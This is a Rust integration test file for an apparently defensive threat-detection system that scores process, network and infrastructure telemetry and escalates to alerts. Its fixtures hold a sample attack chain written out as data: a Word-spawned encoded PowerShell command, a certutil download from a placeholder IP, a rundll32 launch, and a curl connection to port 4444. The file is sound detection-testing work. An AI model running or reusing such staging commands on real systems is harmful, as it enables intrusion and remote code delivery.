#![allow(clippy::unwrap_used)]

use ed25519_dalek::SigningKey;
use serde_json::json;
use std::sync::Arc;
use swarm_core::agent::SwarmMode;
use swarm_core::config::{PheromoneBackendConfig, PheromoneConfig, SwarmConfig};
use swarm_core::pheromone::ThreatClass;
use swarm_core::telemetry::{
    InfrastructureHealthEvent, TelemetryEvent, TelemetryPayload, ThermalAnomalyEvent,
    ThermalSeverity,
};
use swarm_core::types::{AgentId, EscalationEvent, Severity};
use swarm_pheromone::substrate::validate_deposit_signature;
use swarm_pheromone::{InMemoryPheromoneSubstrate, PheromoneSubstrate};
use swarm_runtime::config::load_config;
use swarm_runtime::control::build_composite_detector;
use swarm_runtime::detection::detect_and_deposit;
use swarm_runtime::escalation::ConcentrationMonitor;
use swarm_whisker::{
    CompositeDetector, DetectionFinding, DetectionStrategy, NetworkConnectEvent, ProcessStartEvent,
};

fn test_signing_key() -> SigningKey {
    SigningKey::from_bytes(&[42u8; 32])
}

fn test_agent_id() -> AgentId {
    AgentId::from_verifying_key(&test_signing_key().verifying_key())
}

fn config_with_network_connect_profile(
    profile: serde_json::Value,
) -> Result<SwarmConfig, Box<dyn std::error::Error>> {
    let mut config = load_config(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/../../rulesets/default.yaml"
    ))?;
    config.detection.strategy = "network_connect".to_string();
    config.detection.profiles.network_connect = Some(profile);
    Ok(config)
}

fn network_event(
    event_id: &str,
    timestamp: i64,
    destination_ip: &str,
    destination_port: u16,
) -> TelemetryEvent {
    TelemetryEvent {
        source: "integration".to_string(),
        event_id: event_id.to_string(),
        timestamp,
        host_id: Some("host-network".to_string()),
        payload: TelemetryPayload::NetworkConnect(NetworkConnectEvent {
            process_name: "curl".to_string(),
            destination_ip: destination_ip.to_string(),
            destination_port,
            protocol: "TCP".to_string(),
        }),
    }
}

fn execution_pheromone_config() -> PheromoneConfig {
    PheromoneConfig {
        default_half_life_secs: 3600.0,
        evaporation_threshold: 0.01,
        min_sources_for_escalation: 3,
        alert_threshold: 2.5,
        incident_threshold: 4.5,
        deescalation_cooldown_secs: 300,
        response_playbook: Default::default(),
        backend: PheromoneBackendConfig::InMemory,
    }
}

fn execution_cross_signal_pheromone_config() -> PheromoneConfig {
    PheromoneConfig {
        min_sources_for_escalation: 2,
        alert_threshold: 1.5,
        incident_threshold: 3.0,
        ..execution_pheromone_config()
    }
}

fn staged_process_event(
    event_id: &str,
    timestamp: i64,
    parent_process: &str,
    process_name: &str,
    command_line: &str,
) -> TelemetryEvent {
    TelemetryEvent {
        source: "integration".to_string(),
        event_id: event_id.to_string(),
        timestamp,
        host_id: Some("host-execution".to_string()),
        payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
            parent_process: parent_process.to_string(),
            process_name: process_name.to_string(),
            command_line: command_line.to_string(),
            user: Some("alice".to_string()),
            executable_path: None,
            signer: None,
            signature_valid: None,
        }),
    }
}

fn config_with_execution_and_infrastructure_strategies()
-> Result<SwarmConfig, Box<dyn std::error::Error>> {
    let mut config = load_config(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/../../rulesets/default.yaml"
    ))?;
    config.detection.strategy = "suspicious_process_tree".to_string();
    config.detection.strategies = vec![
        "suspicious_process_tree".to_string(),
        "infrastructure_anomaly".to_string(),
    ];
    config.detection.profiles.infrastructure_anomaly = Some(json!({
        "min_sustained_high_cpu_samples": 2,
        "cpu_sustained_percent": 95.0,
        "load_saturated_threshold": 4.0,
        "quiet_network_tx_bytes": 1024,
        "quiet_network_rx_bytes": 1024
    }));
    config.pheromone = execution_cross_signal_pheromone_config();
    Ok(config)
}

fn infra_health_event(event_id: &str, timestamp: i64, cpu_usage_percent: f64) -> TelemetryEvent {
    TelemetryEvent {
        source: "sentinel".to_string(),
        event_id: event_id.to_string(),
        timestamp,
        host_id: Some("host-execution".to_string()),
        payload: TelemetryPayload::InfrastructureHealth(InfrastructureHealthEvent {
            node_name: "host-execution".to_string(),
            cpu_usage_percent,
            cpu_frequency_mhz: 3200.0,
            load_average_1m: 8.0,
            load_average_5m: 7.0,
            load_average_15m: 6.0,
            memory_usage_percent: 70.0,
            memory_available_bytes: 512,
            disk_usage_percent: 40.0,
            disk_io_latency_ms: 6.0,
            network_rx_bytes: 64,
            network_tx_bytes: 64,
            network_rx_errors: 0,
            network_tx_errors: 0,
            failure_probability: 0.82,
            prediction_confidence: 0.9,
            time_to_failure_secs: 45.0,
            collection_duration_ms: 3.0,
        }),
    }
}

fn infra_thermal_event(event_id: &str, timestamp: i64) -> TelemetryEvent {
    TelemetryEvent {
        source: "sentinel".to_string(),
        event_id: event_id.to_string(),
        timestamp,
        host_id: Some("host-execution".to_string()),
        payload: TelemetryPayload::ThermalAnomaly(ThermalAnomalyEvent {
            node_name: "host-execution".to_string(),
            temperature_celsius: 82.0,
            cpu_throttled: true,
            trend_slope: 0.9,
            severity: ThermalSeverity::High,
            estimated_time_to_critical_secs: 30.0,
        }),
    }
}

#[derive(Clone)]
struct ExecutionStageDetector {
    strategy_id: &'static str,
    target_event_id: &'static str,
    stage_name: &'static str,
}

impl DetectionStrategy for ExecutionStageDetector {
    fn as_any(&self) -> &dyn std::any::Any {
        self
    }

    fn id(&self) -> &str {
        self.strategy_id
    }

    fn evaluate(&self, event: &TelemetryEvent) -> Vec<DetectionFinding> {
        if event.event_id != self.target_event_id {
            return Vec::new();
        }

        let TelemetryPayload::ProcessStart(process) = &event.payload else {
            return Vec::new();
        };

        vec![DetectionFinding {
            finding_id: format!("{}:{}", self.strategy_id, event.event_id),
            event_id: event.event_id.clone(),
            threat_class: ThreatClass::Execution,
            severity: Severity::High,
            confidence: 1.0,
            evidence: json!({
                "stage": self.stage_name,
                "parent_process": process.parent_process,
                "process_name": process.process_name,
                "command_line": process.command_line,
                "host_id": event.host_id,
            }),
            strategy_id: self.strategy_id.to_string(),
        }]
    }
}

#[tokio::test]
async fn network_connect_end_to_end_produces_signed_command_and_control_deposit()
-> Result<(), Box<dyn std::error::Error>> {
    let config = config_with_network_connect_profile(json!({
        "suspicious_ports": [4444],
    }))?;
    let detector = build_composite_detector(&config.detection)?;
    let substrate = InMemoryPheromoneSubstrate::new(config.pheromone.clone());
    let outcome = detect_and_deposit(
        &detector,
        &substrate,
        &network_event("network-c2-proof", 1_700_000_000_000, "198.51.100.25", 4444),
        &AgentId::from_verifying_key(&test_signing_key().verifying_key()),
        &config.pheromone,
        &test_signing_key(),
    )
    .await?;

    assert_eq!(outcome.findings.len(), 1);
    assert_eq!(outcome.findings[0].strategy_id, "network_connect");
    assert_eq!(
        outcome.findings[0].threat_class,
        ThreatClass::CommandAndControl
    );
    assert_eq!(outcome.deposits.len(), 1);
    assert_eq!(
        outcome.deposits[0].agent_id.0,
        format!("{}:network_connect", test_agent_id())
    );
    validate_deposit_signature(&outcome.deposits[0])?;

    let persisted = substrate.recent_deposits(10).await?;
    assert_eq!(persisted.len(), 1);
    assert_eq!(persisted[0].threat_class, ThreatClass::CommandAndControl);
    assert_eq!(
        persisted[0].agent_id.0,
        format!("{}:network_connect", test_agent_id())
    );
    validate_deposit_signature(&persisted[0])?;

    Ok(())
}

#[tokio::test]
async fn composite_execution_sequence_reaches_three_distinct_sources_and_alerts()
-> Result<(), Box<dyn std::error::Error>> {
    let detector = CompositeDetector::new(vec![
        Box::new(ExecutionStageDetector {
            strategy_id: "macro_launcher",
            target_event_id: "stage-1",
            stage_name: "macro launch",
        }),
        Box::new(ExecutionStageDetector {
            strategy_id: "encoded_stager",
            target_event_id: "stage-2",
            stage_name: "encoded stager",
        }),
        Box::new(ExecutionStageDetector {
            strategy_id: "lolbin_runner",
            target_event_id: "stage-3",
            stage_name: "lolbin runner",
        }),
    ]);
    let substrate = Arc::new(InMemoryPheromoneSubstrate::new(execution_pheromone_config()));
    let events = [
        staged_process_event(
            "stage-1",
            1_700_000_000,
            "winword",
            "powershell",
            "powershell.exe -enc AAAA",
        ),
        staged_process_event(
            "stage-2",
            1_700_000_010,
            "powershell",
            "cmd",
            "cmd.exe /c certutil -urlcache -f http://198.51.100.25/a.bin a.bin",
        ),
        staged_process_event(
            "stage-3",
            1_700_000_020,
            "cmd",
            "rundll32",
            "rundll32.exe a.dll,EntryPoint",
        ),
    ];

    for event in &events {
        let outcome = detect_and_deposit(
            &detector,
            substrate.as_ref(),
            event,
            &AgentId::from_verifying_key(&test_signing_key().verifying_key()),
            &execution_pheromone_config(),
            &test_signing_key(),
        )
        .await?;

        assert_eq!(outcome.findings.len(), 1);
        assert_eq!(outcome.deposits.len(), 1);
        assert_eq!(outcome.findings[0].threat_class, ThreatClass::Execution);
        assert_eq!(
            outcome.deposits[0].agent_id.0,
            format!("{}:{}", test_agent_id(), outcome.findings[0].strategy_id)
        );
        validate_deposit_signature(&outcome.deposits[0])?;
    }

    let concentration = substrate
        .query_concentration(&ThreatClass::Execution, 1_700_000_020)
        .await?;
    assert_eq!(concentration.distinct_sources, 3);
    assert!(concentration.total_strength >= 2.5);

    let mut monitor =
        ConcentrationMonitor::new(execution_pheromone_config(), Arc::clone(&substrate));
    let outcome = monitor.evaluate_all(1_700_000_020).await?;
    assert!(outcome.mode_changed);
    assert_eq!(outcome.current_mode, SwarmMode::Alert);
    assert_eq!(outcome.events.len(), 1);

    match &outcome.events[0] {
        EscalationEvent::Alert {
            threat_class,
            distinct_sources,
            ..
        } => {
            assert_eq!(threat_class, &ThreatClass::Execution);
            assert_eq!(*distinct_sources, 3);
        }
        other => panic!("expected alert event, got {other:?}"),
    }

    let persisted = substrate.recent_deposits(10).await?;
    assert_eq!(persisted.len(), 3);
    let base = test_agent_id();
    assert!(
        persisted
            .iter()
            .any(|deposit| deposit.agent_id.0 == format!("{base}:macro_launcher"))
    );
    assert!(
        persisted
            .iter()
            .any(|deposit| deposit.agent_id.0 == format!("{base}:encoded_stager"))
    );
    assert!(
        persisted
            .iter()
            .any(|deposit| deposit.agent_id.0 == format!("{base}:lolbin_runner"))
    );

    Ok(())
}

#[tokio::test]
async fn infrastructure_and_behavioral_execution_signals_share_alert_lane()
-> Result<(), Box<dyn std::error::Error>> {
    let config = config_with_execution_and_infrastructure_strategies()?;
    let detector = build_composite_detector(&config.detection)?;
    let substrate = Arc::new(InMemoryPheromoneSubstrate::new(config.pheromone.clone()));
    let events = [
        infra_health_event("infra-1", 1_700_001_000, 97.0),
        infra_health_event("infra-2", 1_700_001_020, 98.0),
        infra_thermal_event("infra-3", 1_700_001_040),
        staged_process_event(
            "stage-4",
            1_700_001_050,
            "winword",
            "powershell",
            "powershell.exe -enc AAAA",
        ),
    ];

    let infra_outcome = detect_and_deposit(
        &detector,
        substrate.as_ref(),
        &events[0],
        &AgentId::from_verifying_key(&test_signing_key().verifying_key()),
        &config.pheromone,
        &test_signing_key(),
    )
    .await?;
    assert!(infra_outcome.findings.is_empty());

    let infra_outcome = detect_and_deposit(
        &detector,
        substrate.as_ref(),
        &events[1],
        &AgentId::from_verifying_key(&test_signing_key().verifying_key()),
        &config.pheromone,
        &test_signing_key(),
    )
    .await?;
    assert!(infra_outcome.findings.is_empty());

    let infra_outcome = detect_and_deposit(
        &detector,
        substrate.as_ref(),
        &events[2],
        &AgentId::from_verifying_key(&test_signing_key().verifying_key()),
        &config.pheromone,
        &test_signing_key(),
    )
    .await?;
    assert_eq!(infra_outcome.findings.len(), 1);
    assert_eq!(
        infra_outcome.findings[0].strategy_id,
        "infrastructure_anomaly"
    );
    assert_eq!(
        infra_outcome.findings[0].threat_class,
        ThreatClass::Execution
    );

    let behavioral_outcome = detect_and_deposit(
        &detector,
        substrate.as_ref(),
        &events[3],
        &AgentId::from_verifying_key(&test_signing_key().verifying_key()),
        &config.pheromone,
        &test_signing_key(),
    )
    .await?;
    assert_eq!(behavioral_outcome.findings.len(), 1);
    assert_eq!(
        behavioral_outcome.findings[0].strategy_id,
        "suspicious_process_tree"
    );
    assert_eq!(
        behavioral_outcome.findings[0].threat_class,
        ThreatClass::Execution
    );

    let concentration = substrate
        .query_concentration(&ThreatClass::Execution, 1_700_001_050)
        .await?;
    assert_eq!(concentration.distinct_sources, 2);
    assert!(concentration.total_strength >= 1.5);

    let mut monitor = ConcentrationMonitor::new(config.pheromone.clone(), Arc::clone(&substrate));
    let outcome = monitor.evaluate_all(1_700_001_050).await?;
    assert!(outcome.mode_changed);
    assert_eq!(outcome.current_mode, SwarmMode::Alert);
    assert_eq!(outcome.events.len(), 1);
    match &outcome.events[0] {
        EscalationEvent::Alert {
            threat_class,
            distinct_sources,
            ..
        } => {
            assert_eq!(threat_class, &ThreatClass::Execution);
            assert_eq!(*distinct_sources, 2);
        }
        other => panic!("expected alert event, got {other:?}"),
    }

    let persisted = substrate.recent_deposits(10).await?;
    let base = test_agent_id();
    assert!(
        persisted
            .iter()
            .any(|deposit| deposit.agent_id.0 == format!("{base}:infrastructure_anomaly"))
    );
    assert!(
        persisted
            .iter()
            .any(|deposit| deposit.agent_id.0 == format!("{base}:suspicious_process_tree"))
    );

    Ok(())
}
